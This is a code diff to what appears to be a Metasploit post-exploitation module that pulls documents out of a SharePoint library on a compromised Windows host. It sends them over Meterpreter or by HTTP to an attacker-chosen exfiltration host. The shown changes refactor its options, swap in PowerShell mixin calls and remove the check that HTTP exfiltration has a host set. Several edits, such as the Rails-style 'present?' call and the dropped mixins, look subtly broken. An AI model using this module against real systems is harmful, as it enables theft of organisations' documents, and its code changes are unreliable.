@@ -5,8 +5,7 @@
 class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::Powershell
-  include Msf::Module::Stability
-  include Msf::Module::SideEffects
+
   Rank = NormalRanking
 
   def initialize(info = {})
@@ -21,7 +20,7 @@ class MetasploitModule < Msf::Post
       'Author' => ['Vikram Verma'],
       'License' => MSF_LICENSE,
       'Platform' => 'win',
-      'Arch' => ARCH_X86,
+      'Arch' => [ARCH_X86, ARCH_X64], # Updated to support both
       'Notes' => notes
     }
   end
@@ -49,15 +48,19 @@ class MetasploitModule < Msf::Post
   end
 
   def register_module_options
-    register_options([
+    register_options(build_options)
+  end
+
+  def build_options
+    [
       OptString.new('SITE_URL', [true, 'Full URL of the SharePoint site', 'http://sharepoint.local']),
       OptString.new('LIBRARY', [true, 'Target document library name', 'Documents']),
-       OptEnum.new('EXFIL_METHOD', [ true, 'Exfiltration method (HTTP or METERPRETER)', 'METERPRETER', ['HTTP', 'METERPRETER']])
-
+      OptEnum.new('EXFIL_METHOD',
+                  [true, 'Exfiltration method (HTTP or METERPRETER)', 'METERPRETER', %w[HTTP METERPRETER]]),
       OptString.new('EXFIL_HOST', [false, 'Host for HTTP exfiltration', '']),
       OptInt.new('EXFIL_PORT', [false, 'Port for HTTP exfiltration', 8080]),
       OptInt.new('MAX_SIZE', [true, 'Max file size to exfiltrate (bytes)', 10_485_760]) # 10MB
-    ])
+    ]
   end
 
   def check
@@ -67,6 +70,7 @@ class MetasploitModule < Msf::Post
   end
 
   def run
+    fail_with(Failure::NotVulnerable, 'No active session available') unless session
 
     handle_exfiltration_config
     execute_payload
@@ -74,19 +78,11 @@ class MetasploitModule < Msf::Post
 
   def execute_payload
     print_status('Generating SharePoint document extractor payload...')
-    encoded_cmd = generate_psh_payload(build_ps_payload, arch: 'x86', encode: true)
+    encoded_cmd = encode_script(build_ps_payload) # Updated to use PowerShell mixin API
     print_status("Executing payload on target session #{session.sid}...")
-    output = execute_command(encoded_cmd)
+    output = execute_script(encoded_cmd)
     process_output(output) if output
     print_status('Check session output manually for results.') unless session.type == 'meterpreter'
-  end
-
-  def execute_command(encoded_cmd)
-    if session.type == 'meterpreter'
-      session.shell_command("powershell.exe -EncodedCommand #{encoded_cmd}")
-    else
-      session.shell_write("powershell.exe -EncodedCommand #{encoded_cmd}\n")
-    end
   end
 
   def build_ps_payload
@@ -188,28 +184,25 @@ class MetasploitModule < Msf::Post
 
   def handle_exfiltration_config
     method = datastore['EXFIL_METHOD'].upcase
-    if method == 'HTTP' && datastore['EXFIL_HOST'].to_s.empty?
-      fail_with(Failure::BadConfig,
-                'EXFIL_HOST required for HTTP exfiltration')
-    end
     if method == 'METERPRETER' && session.type != 'meterpreter'
       fail_with(Failure::BadConfig,
-                'METERPRETER exfiltration requires a Meterpreter session')
+                'METERPRETER requires a Meterpreter session')
     end
-
     print_status("Exfiltration method: #{method}")
   end
 
   def process_output(output)
-    return unless output&.empty? == false
+    return unless output.present?
 
-    output.split("\n").each { |line| handle_output_line(line) }
+    output.split("\n").each do |line|
+      handle_output_line(line)
+    end
   end
 
   def handle_output_line(line)
     case line
     when /^FILE:([^:]+):(.*)$/ then save_file(Regexp.last_match(1), Regexp.last_match(2))
-    when /^SUCCESS:HTTP:([^:]+):(\d+)$/ then log_http_success(Regexp.last_match(1), Regexp.last_match(2))
+    when /^SUCCESS:HTTP:([^:]+):(\d+)$/ then print_http_success(Regexp.last_match(1), Regexp.last_match(2))
     when /^ERROR:(.+)$/ then print_error("Error: #{Regexp.last_match(1)}")
     when /^INFO:(.+)$/ then print_status("Info: #{Regexp.last_match(1)}")
     when /^SKIP:(.+)$/ then print_warning("Skipped: #{Regexp.last_match(1)}")
@@ -217,12 +210,13 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  def log_http_success(file_name, bytes)
+  def print_http_success(file_name, bytes)
     print_good("Exfiltrated #{file_name} via HTTP (#{bytes} bytes)")
   end
 
   def save_file(file_name, b64_data)
     file_path = store_loot('sharepoint.document', 'application/octet-stream', session,
-            print_good("Saved #{Rex::Text.decode_base64(b64_data)} to #{file_path}")
+                           Rex::Text.decode_base64(b64_data), file_name)
+    print_good("Saved #{file_name} to #{file_path}")
   end
 end
